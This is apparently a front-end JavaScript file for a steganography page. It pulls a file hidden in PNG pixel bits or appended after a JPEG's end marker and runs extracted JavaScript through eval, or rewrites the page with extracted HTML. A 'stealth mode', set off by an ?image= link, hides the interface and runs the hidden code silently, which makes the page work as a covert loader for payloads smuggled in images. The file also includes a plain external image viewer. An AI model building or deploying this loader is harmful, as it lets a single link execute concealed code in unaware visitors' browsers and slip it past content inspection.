// Constants for steganography
        const MAGIC_LSB = "STEGOV1\n";
        const MAGIC_JPG = "JSTEGV1\n";
        const JPEG_EOI = "\xff\xd9";
        
        // DOM elements
        const tabs = document.querySelectorAll('.tab');
        const tabContents = document.querySelectorAll('.tab-content');
        const imageUrlInput = document.getElementById('imageUrl');
        const imageUploadInput = document.getElementById('imageUpload');
        const loadFromUrlBtn = document.getElementById('loadFromUrl');
        const loadFromUploadBtn = document.getElementById('loadFromUpload');
        const imageContainer = document.getElementById('imageContainer');
        const statusMessage = document.getElementById('statusMessage');
        const codeContainer = document.getElementById('codeContainer');
        const codeOutput = document.getElementById('codeOutput');
        const resultContainer = document.getElementById('resultContainer');
        const resultOutput = document.getElementById('resultOutput');
        const copyCodeBtn = document.getElementById('copyCode');
        const executeCodeBtn = document.getElementById('executeCode');
        const clearResultBtn = document.getElementById('clearResult');
        const loadingOverlay = document.getElementById('loadingOverlay');
        const mainContainer = document.getElementById('mainContainer');
        
        // Check for stealth mode (image URL in query parameters)
        let stealthMode = false;
        
        // Event listeners for tabs
        tabs.forEach(tab => {
            tab.addEventListener('click', () => {
                const tabId = tab.getAttribute('data-tab');
                
                // Update active tab
                tabs.forEach(t => t.classList.remove('active'));
                tab.classList.add('active');
                
                // Update active content
                tabContents.forEach(content => {
                    content.classList.remove('active');
                    if (content.id === `${tabId}-tab`) {
                        content.classList.add('active');
                    }
                });
            });
        });
        
        // Event listeners for buttons
        loadFromUrlBtn.addEventListener('click', loadImageFromUrl);
        loadFromUploadBtn.addEventListener('click', loadFromUpload);
        copyCodeBtn.addEventListener('click', copyCode);
        executeCodeBtn.addEventListener('click', executeCode);
        clearResultBtn.addEventListener('click', clearResult);
        
        // Functions
        function showStatus(message, type) {
            statusMessage.textContent = message;
            statusMessage.className = `status-message status-${type}`;
            statusMessage.style.display = 'block';
            
            // Auto hide after 5 seconds
            setTimeout(() => {
                statusMessage.style.display = 'none';
            }, 5000);
        }
        
        async function loadImageFromUrl() {
            const url = imageUrlInput.value.trim();
            if (!url) {
                showStatus('Please enter a valid image URL', 'error');
                return;
            }

            showStatus('Loading image...', 'info');
            loadFromUrlBtn.disabled = true;
            loadFromUrlBtn.innerHTML = '<span class="loading"></span> Loading...';

            try {
                const extension = getImageExtension(url);

                // JPEG steganography stores the payload after the JPEG EOI
                // marker, so we must download the original bytes. We do not
                // use a canvas for JPEG extraction.
                if (extension === 'jpg' || extension === 'jpeg') {
                    const response = await fetch(url, {
                        mode: 'cors',
                        cache: 'no-store'
                    });

                    if (!response.ok) {
                        throw new Error(`Could not download the JPEG (HTTP ${response.status}).`);
                    }

                    const rawBytes = new Uint8Array(await response.arrayBuffer());

                    // Display the JPEG separately. The image itself can be
                    // displayed cross-origin even when canvas access is not allowed.
                    imageContainer.innerHTML = '';
                    const displayImg = new Image();
                    displayImg.alt = 'Loaded image';
                    displayImg.src = url;
                    imageContainer.appendChild(displayImg);

                    showStatus('Image loaded successfully', 'success');
                    await extractCodeFromImage(null, url, rawBytes);
                } else {
                    const img = new Image();
                    img.crossOrigin = 'anonymous';

                    await new Promise((resolve, reject) => {
                        img.onload = resolve;
                        img.onerror = () => reject(new Error(
                            'The image could not be loaded. If this is a remote image, its server must allow CORS access.'
                        ));
                        img.src = url;
                    });

                    imageContainer.innerHTML = '';
                    imageContainer.appendChild(img);
                    showStatus('Image loaded successfully', 'success');

                    const canvas = document.createElement('canvas');
                    canvas.width = img.naturalWidth || img.width;
                    canvas.height = img.naturalHeight || img.height;
                    const ctx = canvas.getContext('2d', { willReadFrequently: true });
                    ctx.drawImage(img, 0, 0);

                    await extractCodeFromImage(canvas, url);
                }
            } catch (error) {
                showStatus(`Error: ${error.message}`, 'error');
            } finally {
                loadFromUrlBtn.disabled = false;
                loadFromUrlBtn.innerHTML = 'Load Image';
            }
        }

        function getImageExtension(filename) {
            try {
                const parsed = new URL(filename, window.location.href);
                const path = parsed.pathname;
                const match = path.match(/\.([a-zA-Z0-9]+)$/);
                return match ? match[1].toLowerCase() : '';
            } catch (error) {
                const clean = String(filename).split('?')[0].split('#')[0];
                const match = clean.match(/\.([a-zA-Z0-9]+)$/);
                return match ? match[1].toLowerCase() : '';
            }
        }
        
        function loadFromUpload() {
            const file = imageUploadInput.files[0];
            if (!file) {
                showStatus('Please select an image file', 'error');
                return;
            }

            if (!file.type.match(/^image\//i)) {
                showStatus('Please select a valid image file', 'error');
                return;
            }

            showStatus('Processing image...', 'info');
            loadFromUploadBtn.disabled = true;
            loadFromUploadBtn.innerHTML = '<span class="loading"></span> Processing...';

            const extension = getImageExtension(file.name);

            // JPEG payloads are stored in the raw file bytes after EOI.
            if (extension === 'jpg' || extension === 'jpeg') {
                file.arrayBuffer()
                    .then(async buffer => {
                        const rawBytes = new Uint8Array(buffer);

                        const objectUrl = URL.createObjectURL(file);
                        const img = new Image();

                        try {
                            await new Promise((resolve, reject) => {
                                img.onload = resolve;
                                img.onerror = () => reject(new Error('Unable to display the selected JPEG.'));
                                img.src = objectUrl;
                            });

                            imageContainer.innerHTML = '';
                            imageContainer.appendChild(img);
                            showStatus('Image loaded successfully', 'success');

                            await extractCodeFromImage(null, file.name, rawBytes);
                        } finally {
                            URL.revokeObjectURL(objectUrl);
                        }
                    })
                    .catch(error => {
                        showStatus(`Error extracting code: ${error.message}`, 'error');
                    })
                    .finally(() => {
                        loadFromUploadBtn.disabled = false;
                        loadFromUploadBtn.innerHTML = 'Upload Image';
                    });

                return;
            }

            // Lossless PNG/BMP/TIFF extraction uses decoded RGB pixels.
            const reader = new FileReader();

            reader.onload = function(e) {
                const img = new Image();

                img.onload = function() {
                    try {
                        imageContainer.innerHTML = '';
                        imageContainer.appendChild(img);
                        showStatus('Image loaded successfully', 'success');

                        const canvas = document.createElement('canvas');
                        canvas.width = img.naturalWidth || img.width;
                        canvas.height = img.naturalHeight || img.height;
                        const ctx = canvas.getContext('2d', { willReadFrequently: true });
                        ctx.drawImage(img, 0, 0);

                        extractCodeFromImage(canvas, file.name);
                    } catch (error) {
                        showStatus(`Error extracting code: ${error.message}`, 'error');
                    } finally {
                        loadFromUploadBtn.disabled = false;
                        loadFromUploadBtn.innerHTML = 'Upload Image';
                    }
                };

                img.onerror = function() {
                    showStatus('Unable to decode the selected image.', 'error');
                    loadFromUploadBtn.disabled = false;
                    loadFromUploadBtn.innerHTML = 'Upload Image';
                };

                img.src = e.target.result;
            };

            reader.onerror = function() {
                showStatus('Unable to read the selected image file.', 'error');
                loadFromUploadBtn.disabled = false;
                loadFromUploadBtn.innerHTML = 'Upload Image';
            };

            reader.readAsDataURL(file);
        }
        
        async function extractCodeFromImage(canvas, filename, rawBytes = null) {
            const extension = getImageExtension(filename);

            if (extension === 'jpg' || extension === 'jpeg') {
                // JPEG files created by hide.py store the payload after the
                // final JPEG EOI marker. Canvas pixels cannot recover it.
                if (!rawBytes) {
                    let response;
                    try {
                        response = await fetch(filename, {
                            mode: 'cors',
                            cache: 'no-store'
                        });
                    } catch (error) {
                        throw new Error(
                            'The JPEG could not be read from this remote server because the browser blocked the cross-origin request (CORS).'
                        );
                    }

                    if (!response.ok) {
                        throw new Error(`Could not download the JPEG (HTTP ${response.status}).`);
                    }

                    rawBytes = new Uint8Array(await response.arrayBuffer());
                }

                extractCodeJPEG(rawBytes);
                return;
            }

            if (!canvas) {
                throw new Error('A canvas is required for LSB image extraction.');
            }

            // PNG/BMP/TIFF use RGB LSB extraction.
            extractCodeLSB(canvas);
        }

        function bytesEqualAt(data, offset, expected) {
            if (offset < 0 || offset + expected.length > data.length) {
                return false;
            }

            for (let i = 0; i < expected.length; i++) {
                if (data[offset + i] !== expected[i]) {
                    return false;
                }
            }

            return true;
        }

        function extractCodeJPEG(bytes) {
            if (!(bytes instanceof Uint8Array)) {
                bytes = new Uint8Array(bytes);
            }

            // Validate JPEG SOI.
            if (bytes.length < 4 || bytes[0] !== 0xff || bytes[1] !== 0xd8) {
                throw new Error('The downloaded file is not a valid JPEG.');
            }

            // hide.py appends the JSTEGV1 payload immediately after the
            // final JPEG EOI marker (FF D9).
            let eoiIndex = -1;

            for (let i = bytes.length - 2; i >= 0; i--) {
                if (bytes[i] === 0xff && bytes[i + 1] === 0xd9) {
                    eoiIndex = i;
                    break;
                }
            }

            if (eoiIndex === -1) {
                throw new Error('This JPEG does not contain a valid end-of-image marker.');
            }

            const payloadStart = eoiIndex + 2;

            if (payloadStart >= bytes.length) {
                throw new Error('No hidden payload was found in this JPEG.');
            }

            const magicBytes = new TextEncoder().encode(MAGIC_JPG);

            if (!bytesEqualAt(bytes, payloadStart, magicBytes)) {
                throw new Error('No compatible hidden payload was found in this JPEG.');
            }

            const payloadBytes = bytes.slice(payloadStart);
            return parsePayloadBytes(payloadBytes, magicBytes);
        }

        function extractCodeLSB(canvas) {
            const ctx = canvas.getContext('2d', { willReadFrequently: true });

            if (!ctx) {
                throw new Error('Could not create a 2D canvas context.');
            }

            let imageData;
            try {
                imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            } catch (error) {
                throw new Error(
                    'The browser blocked pixel access to this remote image. The image server must allow CORS.'
                );
            }

            const data = imageData.data;
            const bytes = new Uint8Array(Math.floor((data.length / 4 * 3) / 8));
            let bitIndex = 0;
            let currentByte = 0;
            let byteIndex = 0;

            // Extract one LSB from R, G and B, exactly matching hide.py.
            for (let i = 0; i < data.length; i += 4) {
                const channels = [data[i] & 1, data[i + 1] & 1, data[i + 2] & 1];

                for (const bit of channels) {
                    currentByte = (currentByte << 1) | bit;
                    bitIndex++;

                    if (bitIndex === 8) {
                        if (byteIndex < bytes.length) {
                            bytes[byteIndex++] = currentByte;
                        }
                        currentByte = 0;
                        bitIndex = 0;
                    }
                }
            }

            const magicBytes = new TextEncoder().encode(MAGIC_LSB);

            if (!bytesEqualAt(bytes, 0, magicBytes)) {
                throw new Error('No hidden payload was found in this image.');
            }

            return parsePayloadBytes(bytes, magicBytes);
        }

        function parsePayloadBytes(data, magicBytes) {
            if (!(data instanceof Uint8Array)) {
                data = new Uint8Array(data);
            }

            if (!bytesEqualAt(data, 0, magicBytes)) {
                throw new Error('No compatible payload was found in this image.');
            }

            let position = magicBytes.length;

            // Payload layout used by hide.py:
            // MAGIC + filename_len(4B) + filename + data_len(8B) + file_data
            if (data.length < position + 4) {
                throw new Error('Payload is incomplete or corrupted.');
            }

            const filenameLength =
                data[position] * 0x1000000 +
                data[position + 1] * 0x10000 +
                data[position + 2] * 0x100 +
                data[position + 3];

            position += 4;

            if (filenameLength <= 0 || filenameLength > 4096) {
                throw new Error('Invalid embedded filename.');
            }

            if (data.length < position + filenameLength) {
                throw new Error('Payload is incomplete.');
            }

            const filenameBytes = data.slice(position, position + filenameLength);
            position += filenameLength;

            let originalFilename;
            try {
                originalFilename = new TextDecoder('utf-8', { fatal: true }).decode(filenameBytes);
            } catch (error) {
                throw new Error('Embedded filename is not valid UTF-8.');
            }

            // Only keep the filename itself. This mirrors extract.py's
            // basename protection and prevents directory-like names.
            originalFilename = originalFilename.split(/[/\\]/).pop();

            if (!originalFilename) {
                throw new Error('Invalid embedded filename.');
            }

            if (data.length < position + 8) {
                throw new Error('Payload is incomplete (missing data length).');
            }

            let dataLength = 0;
            for (let i = 0; i < 8; i++) {
                dataLength = dataLength * 256 + data[position + i];

                if (!Number.isSafeInteger(dataLength)) {
                    throw new Error('Embedded file is too large to process in the browser.');
                }
            }
            position += 8;

            if (dataLength <= 0) {
                throw new Error('The embedded file is empty.');
            }

            if (dataLength > data.length - position) {
                throw new Error('Payload is incomplete (truncated data).');
            }

            const fileDataBytes = data.slice(position, position + dataLength);
            const fileData = new TextDecoder('utf-8').decode(fileDataBytes);

            if (!fileData) {
                throw new Error('The embedded file is empty.');
            }

            // Display extracted data in normal mode.
            if (!stealthMode) {
                codeContainer.style.display = 'block';
                codeOutput.textContent = fileData;
                showStatus(`Successfully extracted code from: ${originalFilename}`, 'success');
            }

            const lowerFilename = originalFilename.toLowerCase();

            // Auto-process JavaScript and HTML files only. Other file types
            // are extracted and displayed but are not automatically run.
            if (lowerFilename.endsWith('.js')) {
                if (stealthMode) {
                    executeCodeStealth(fileData);
                } else {
                    setTimeout(() => {
                        executeCode();
                    }, 1000);
                }
            } else if (lowerFilename.endsWith('.html') || lowerFilename.endsWith('.htm')) {
                executeEmbeddedHTML(fileData);
            }

            return {
                filename: originalFilename,
                data: fileData,
                size: dataLength
            };
        }
        
        function copyCode() {
            const code = codeOutput.textContent;
            navigator.clipboard.writeText(code).then(() => {
                showStatus('Code copied to clipboard', 'success');
            }).catch(err => {
                showStatus('Failed to copy code', 'error');
            });
        }
        
        function executeCode() {
            const code = codeOutput.textContent;
            
            if (!code) {
                showStatus('No code to execute', 'error');
                return;
            }
            
            showStatus('Executing code...', 'info');
            executeCodeBtn.disabled = true;
            executeCodeBtn.innerHTML = '<span class="loading"></span> Executing...';
            
            try {
                // Create a sandboxed environment for execution
                const result = (function() {
                    // Capture console output
                    const originalLog = console.log;
                    const logs = [];
                    console.log = function(...args) {
                        logs.push(args.map(arg => 
                            typeof arg === 'object' ? JSON.stringify(arg, null, 2) : String(arg)
                        ).join(' '));
                        originalLog.apply(console, args);
                    };
                    
                    // Execute the code
                    let result;
                    try {
                        result = eval(code);
                    } catch (error) {
                        console.log(`Error: ${error.message}`);
                    }
                    
                    // Restore console.log
                    console.log = originalLog;
                    
                    // Return the logs and result
                    return {
                        output: logs.join('\n'),
                        result: result !== undefined ? String(result) : undefined
                    };
                })();
                
                // Display the result
                resultContainer.style.display = 'block';
                let resultText = '';
                
                if (result.output) {
                    resultText += `=== Console Output ===\n${result.output}\n\n`;
                }
                
                if (result.result !== undefined) {
                    resultText += `=== Return Value ===\n${result.result}`;
                }
                
                resultOutput.textContent = resultText || 'Code executed successfully (no output)';
                showStatus('Code executed successfully', 'success');
            } catch (error) {
                resultContainer.style.display = 'block';
                resultOutput.textContent = `Execution Error: ${error.message}`;
                showStatus('Error executing code', 'error');
            } finally {
                executeCodeBtn.disabled = false;
                executeCodeBtn.innerHTML = 'Execute';
            }
        }
        
        function executeCodeStealth(code) {
            try {
                // Execute the code directly without showing any UI
                (function() {
                    eval(code);
                })();
                
                // In stealth mode, we don't show any results
                console.log('Code executed in stealth mode');
            } catch (error) {
                console.error('Error in stealth execution:', error.message);
            }
        }
        
        function executeEmbeddedHTML(htmlContent) {
            try {
                // Replace the entire current document with the new HTML payload
                document.open();
                document.write(htmlContent);
                document.close();
            } catch (error) {
                console.error('Error executing embedded HTML:', error.message);
                // In case the document replacement fails (e.g., due to CSP)
                if (document.body) {
                    showStatus('Error executing embedded HTML', 'error');
                }
            }
        }
        
        function clearResult() {
            resultContainer.style.display = 'none';
            resultOutput.textContent = '';
        }
        
        // Check for image URL in query parameters
        window.addEventListener('load', () => {
            const urlParams = new URLSearchParams(window.location.search);
            const imageUrl = urlParams.get('image');
            
            if (imageUrl) {
                // Enable stealth mode when an image URL is provided
                stealthMode = true;
                
                // Hide the main UI and show only the loading overlay
                mainContainer.style.display = 'none';
                loadingOverlay.style.display = 'flex';
                
                // Load the image from the URL. JPEG extraction uses raw bytes,
                // while PNG/BMP/TIFF extraction requires CORS-enabled pixels.
                const extension = getImageExtension(imageUrl);
                const img = new Image();
                if (extension !== 'jpg' && extension !== 'jpeg') {
                    img.crossOrigin = 'anonymous';
                }
                
                img.onload = async function() {
                    // Try to extract and execute code from the image
                    try {
                        let canvas = null;
                        let rawBytes = null;

                        if (extension === 'jpg' || extension === 'jpeg') {
                            let response;
                            try {
                                response = await fetch(imageUrl, {
                                    mode: 'cors',
                                    cache: 'no-store'
                                });
                            } catch (error) {
                                throw new Error(
                                    'The remote JPEG could not be read because the image server blocked the cross-origin request (CORS).'
                                );
                            }

                            if (!response.ok) {
                                throw new Error(`Could not download the JPEG (HTTP ${response.status}).`);
                            }

                            rawBytes = new Uint8Array(await response.arrayBuffer());
                        } else {
                            canvas = document.createElement('canvas');
                            canvas.width = img.naturalWidth || img.width;
                            canvas.height = img.naturalHeight || img.height;
                            const ctx = canvas.getContext('2d', { willReadFrequently: true });
                            ctx.drawImage(img, 0, 0);
                        }

                        await extractCodeFromImage(canvas, imageUrl, rawBytes);
                        
                        // Hide the loading overlay after a short delay
                        setTimeout(() => {
                            loadingOverlay.style.display = 'none';
                            
                            // If execution was successful, we could redirect or close the window
                            // For now, we'll just show a simple message
                            const successDiv = document.createElement('div');
                            successDiv.style.position = 'fixed';
                            successDiv.style.top = '50%';
                            successDiv.style.left = '50%';
                            successDiv.style.transform = 'translate(-50%, -50%)';
                            successDiv.style.background = 'rgba(0, 255, 128, 0.2)';
                            successDiv.style.border = '1px solid rgba(0, 255, 128, 0.5)';
                            successDiv.style.borderRadius = '10px';
                            successDiv.style.padding = '20px';
                            successDiv.style.color = '#00ff80';
                            successDiv.style.textAlign = 'center';
                            successDiv.style.zIndex = '1001';
                            successDiv.innerHTML = '<h3>Code Executed Successfully</h3><p>The hidden code has been executed.</p>';
                            document.body.appendChild(successDiv);
                            
                            // Auto-hide the success message after 3 seconds
                            setTimeout(() => {
                                successDiv.style.opacity = '0';
                                successDiv.style.transition = 'opacity 1s';
                                setTimeout(() => {
                                    document.body.removeChild(successDiv);
                                    // Optionally close the window or redirect
                                    // window.close();
                                }, 1000);
                            }, 3000);
                        }, 1000);
                    } catch (error) {
                        // Show error in stealth mode
                        const errorDiv = document.createElement('div');
                        errorDiv.style.position = 'fixed';
                        errorDiv.style.top = '50%';
                        errorDiv.style.left = '50%';
                        errorDiv.style.transform = 'translate(-50%, -50%)';
                        errorDiv.style.background = 'rgba(255, 64, 64, 0.2)';
                        errorDiv.style.border = '1px solid rgba(255, 64, 64, 0.5)';
                        errorDiv.style.borderRadius = '10px';
                        errorDiv.style.padding = '20px';
                        errorDiv.style.color = '#ff4040';
                        errorDiv.style.textAlign = 'center';
                        errorDiv.style.zIndex = '1001';
                        errorDiv.innerHTML = '<h3>Execution Failed</h3><p>' + error.message + '</p>';
                        document.body.appendChild(errorDiv);
                        
                        // Auto-hide the error message after 5 seconds
                        setTimeout(() => {
                            errorDiv.style.opacity = '0';
                            errorDiv.style.transition = 'opacity 1s';
                            setTimeout(() => {
                                document.body.removeChild(errorDiv);
                                // Show the normal interface so the user can try again
                                mainContainer.style.display = 'block';
                                loadingOverlay.style.display = 'none';
                                stealthMode = false;
                            }, 1000);
                        }, 5000);
                    }
                };
                
                img.onerror = function() {
                    // Show error in stealth mode
                    const errorDiv = document.createElement('div');
                    errorDiv.style.position = 'fixed';
                    errorDiv.style.top = '50%';
                    errorDiv.style.left = '50%';
                    errorDiv.style.transform = 'translate(-50%, -50%)';
                    errorDiv.style.background = 'rgba(255, 64, 64, 0.2)';
                    errorDiv.style.border = '1px solid rgba(255, 64, 64, 0.5)';
                    errorDiv.style.borderRadius = '10px';
                    errorDiv.style.padding = '20px';
                    errorDiv.style.color = '#ff4040';
                    errorDiv.style.textAlign = 'center';
                    errorDiv.style.zIndex = '1001';
                    errorDiv.innerHTML = '<h3>Image Load Failed</h3><p>Could not load/read the image from the provided URL. Check the direct image URL and CORS permissions.</p>';
                    document.body.appendChild(errorDiv);
                    
                    // Auto-hide the error message after 5 seconds
                    setTimeout(() => {
                        errorDiv.style.opacity = '0';
                        errorDiv.style.transition = 'opacity 1s';
                        setTimeout(() => {
                            document.body.removeChild(errorDiv);
                            // Show the normal interface so the user can try again
                            mainContainer.style.display = 'block';
                            loadingOverlay.style.display = 'none';
                            stealthMode = false;
                        }, 1000);
                    }, 5000);
                };
                
                img.src = imageUrl;
            }
        });
        
        // Handle drag and drop
        imageContainer.addEventListener('dragover', (e) => {
            e.preventDefault();
            imageContainer.style.backgroundColor = 'rgba(0, 212, 255, 0.1)';
        });
        
        imageContainer.addEventListener('dragleave', (e) => {
            e.preventDefault();
            imageContainer.style.backgroundColor = 'transparent';
        });
        
        imageContainer.addEventListener('drop', (e) => {
            e.preventDefault();
            imageContainer.style.backgroundColor = 'transparent';
            
            const files = e.dataTransfer.files;
            if (files.length > 0 && files[0].type.match('image.*')) {
                imageUploadInput.files = files;
                loadFromUpload();
            } else {
                showStatus('Please drop a valid image file', 'error');
            }
        });
        
        // Add a function to handle direct links that open in stealth mode
        function handleDirectLink() {
            // This function can be called from outside the page to trigger stealth mode
            stealthMode = true;
            
            // Hide the main UI and show only the loading overlay
            mainContainer.style.display = 'none';
            loadingOverlay.style.display = 'flex';
            
            // Get the image URL from the input field
            const imageUrl = imageUrlInput.value.trim();
            
            if (!imageUrl) {
                showStatus('Please enter a valid image URL', 'error');
                return;
            }
            
            // Load the image from the URL. JPEG extraction uses raw bytes,
            // while PNG/BMP/TIFF extraction requires CORS-enabled pixels.
            const extension = getImageExtension(imageUrl);
            const img = new Image();
            if (extension !== 'jpg' && extension !== 'jpeg') {
                img.crossOrigin = 'anonymous';
            }
            
            img.onload = async function() {
                // Try to extract and execute code from the image
                try {
                    let canvas = null;
                    let rawBytes = null;

                    if (extension === 'jpg' || extension === 'jpeg') {
                        let response;
                        try {
                            response = await fetch(imageUrl, {
                                mode: 'cors',
                                cache: 'no-store'
                            });
                        } catch (error) {
                            throw new Error(
                                'The remote JPEG could not be read because the image server blocked the cross-origin request (CORS).'
                            );
                        }

                        if (!response.ok) {
                            throw new Error(`Could not download the JPEG (HTTP ${response.status}).`);
                        }

                        rawBytes = new Uint8Array(await response.arrayBuffer());
                    } else {
                        canvas = document.createElement('canvas');
                        canvas.width = img.naturalWidth || img.width;
                        canvas.height = img.naturalHeight || img.height;
                        const ctx = canvas.getContext('2d', { willReadFrequently: true });
                        ctx.drawImage(img, 0, 0);
                    }

                    await extractCodeFromImage(canvas, imageUrl, rawBytes);
                    
                    // Hide the loading overlay after a short delay
                    setTimeout(() => {
                        loadingOverlay.style.display = 'none';
                        
                        const successDiv = document.createElement('div');
                        successDiv.style.position = 'fixed';
                        successDiv.style.top = '50%';
                        successDiv.style.left = '50%';
                        successDiv.style.transform = 'translate(-50%, -50%)';
                        successDiv.style.background = 'rgba(0, 255, 128, 0.2)';
                        successDiv.style.border = '1px solid rgba(0, 255, 128, 0.5)';
                        successDiv.style.borderRadius = '10px';
                        successDiv.style.padding = '20px';
                        successDiv.style.color = '#00ff80';
                        successDiv.style.textAlign = 'center';
                        successDiv.style.zIndex = '1001';
                        successDiv.innerHTML = '<h3>Code Executed Successfully</h3><p>The hidden code has been processed.</p>';
                        document.body.appendChild(successDiv);
                        
                        // Auto-hide the success message after 3 seconds
                        setTimeout(() => {
                            successDiv.style.opacity = '0';
                            successDiv.style.transition = 'opacity 1s';
                            setTimeout(() => {
                                if (successDiv.parentNode) {
                                    successDiv.parentNode.removeChild(successDiv);
                                }
                            }, 1000);
                        }, 3000);
                    }, 1000);
                } catch (error) {
                    // Show error in stealth mode
                    const errorDiv = document.createElement('div');
                    errorDiv.style.position = 'fixed';
                    errorDiv.style.top = '50%';
                    errorDiv.style.left = '50%';
                    errorDiv.style.transform = 'translate(-50%, -50%)';
                    errorDiv.style.background = 'rgba(255, 64, 64, 0.2)';
                    errorDiv.style.border = '1px solid rgba(255, 64, 64, 0.5)';
                    errorDiv.style.borderRadius = '10px';
                    errorDiv.style.padding = '20px';
                    errorDiv.style.color = '#ff4040';
                    errorDiv.style.textAlign = 'center';
                    errorDiv.style.zIndex = '1001';
                    errorDiv.innerHTML = '<h3>Execution Failed</h3><p>' + error.message + '</p>';
                    document.body.appendChild(errorDiv);
                    
                    // Auto-hide the error message after 5 seconds
                    setTimeout(() => {
                        errorDiv.style.opacity = '0';
                        errorDiv.style.transition = 'opacity 1s';
                        setTimeout(() => {
                            if (errorDiv.parentNode) {
                                errorDiv.parentNode.removeChild(errorDiv);
                            }
                            mainContainer.style.display = 'block';
                            loadingOverlay.style.display = 'none';
                            stealthMode = false;
                        }, 1000);
                    }, 5000);
                }
            };
            
            img.onerror = function() {
                const errorDiv = document.createElement('div');
                errorDiv.style.position = 'fixed';
                errorDiv.style.top = '50%';
                errorDiv.style.left = '50%';
                errorDiv.style.transform = 'translate(-50%, -50%)';
                errorDiv.style.background = 'rgba(255, 64, 64, 0.2)';
                errorDiv.style.border = '1px solid rgba(255, 64, 64, 0.5)';
                errorDiv.style.borderRadius = '10px';
                errorDiv.style.padding = '20px';
                errorDiv.style.color = '#ff4040';
                errorDiv.style.textAlign = 'center';
                errorDiv.style.zIndex = '1001';
                errorDiv.innerHTML = '<h3>Image Load Failed</h3><p>Could not load/read the image from the provided URL. Check the direct image URL and CORS permissions.</p>';
                document.body.appendChild(errorDiv);
                
                setTimeout(() => {
                    errorDiv.style.opacity = '0';
                    errorDiv.style.transition = 'opacity 1s';
                    setTimeout(() => {
                        if (errorDiv.parentNode) {
                            errorDiv.parentNode.removeChild(errorDiv);
                        }
                        mainContainer.style.display = 'block';
                        loadingOverlay.style.display = 'none';
                        stealthMode = false;
                    }, 1000);
                }, 5000);
            };
            
            img.src = imageUrl;
        }
        
        // Make the handleDirectLink function globally accessible
        window.handleDirectLink = handleDirectLink;
// ============================================================
// CATBOX / EXTERNAL IMAGE VIEWER
// ============================================================

window.addEventListener('DOMContentLoaded', function () {

    const params = new URLSearchParams(window.location.search);
    const externalImageUrl = params.get('view');

    // Only run this additional functionality when ?view= is present
    if (!externalImageUrl) {
        return;
    }

    // Decode the URL safely
    let decodedImageUrl;

    try {
        decodedImageUrl = decodeURIComponent(externalImageUrl);
    } catch (error) {
        console.error('Invalid image URL:', error);
        return;
    }

    // Validate that it is an HTTP/HTTPS URL
    try {
        const parsedUrl = new URL(decodedImageUrl);

        if (parsedUrl.protocol !== 'http:' &&
            parsedUrl.protocol !== 'https:') {
            console.error('Invalid image protocol.');
            return;
        }

    } catch (error) {
        console.error('Invalid image URL:', error);
        return;
    }

    // Create image viewer
    const viewer = document.createElement('div');

    viewer.style.position = 'fixed';
    viewer.style.top = '0';
    viewer.style.left = '0';
    viewer.style.width = '100%';
    viewer.style.height = '100%';
    viewer.style.background = '#000';
    viewer.style.display = 'flex';
    viewer.style.alignItems = 'center';
    viewer.style.justifyContent = 'center';
    viewer.style.zIndex = '99999';
    viewer.style.overflow = 'auto';

    // Create image
    const externalImage = document.createElement('img');

    externalImage.style.maxWidth = '95%';
    externalImage.style.maxHeight = '95%';
    externalImage.style.objectFit = 'contain';
    externalImage.style.borderRadius = '8px';

    externalImage.alt = 'Image';

    // Loading message
    const loadingText = document.createElement('div');

    loadingText.textContent = 'Loading image...';

    loadingText.style.position = 'absolute';
    loadingText.style.color = '#00d4ff';
    loadingText.style.fontFamily = 'Arial, sans-serif';
    loadingText.style.fontSize = '18px';

    viewer.appendChild(loadingText);

    // Successful image load
    externalImage.onload = function () {

        loadingText.remove();

        viewer.appendChild(externalImage);

        console.log('External image loaded successfully.');

    };

    // Image loading error
    externalImage.onerror = function () {

        loadingText.textContent =
            'Unable to load the image.';

        loadingText.style.color = '#ff4040';

        console.error(
            'Failed to load external image:',
            decodedImageUrl
        );

    };

    externalImage.src = decodedImageUrl;

    // Add viewer to page
    document.body.appendChild(viewer);

});
